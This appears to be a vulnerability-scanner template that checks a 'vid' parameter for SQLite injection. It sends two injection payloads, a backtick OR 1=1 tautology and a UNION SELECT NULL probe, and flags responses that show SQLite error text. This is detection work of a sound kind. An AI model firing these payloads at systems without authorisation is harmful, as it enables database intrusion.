id: sqli6-sqlite-06
name: 'SQLi sqlite probe in vid'
severity: high
type: active
tags:
  - sqli
  - injection
  - sqlite
description: 'Triggers sqlite error via vid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      vid:
        - '` OR `1`=`1'
        - ''' UNION SELECT NULL,NULL,NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLite'
          - 'sqlite3'
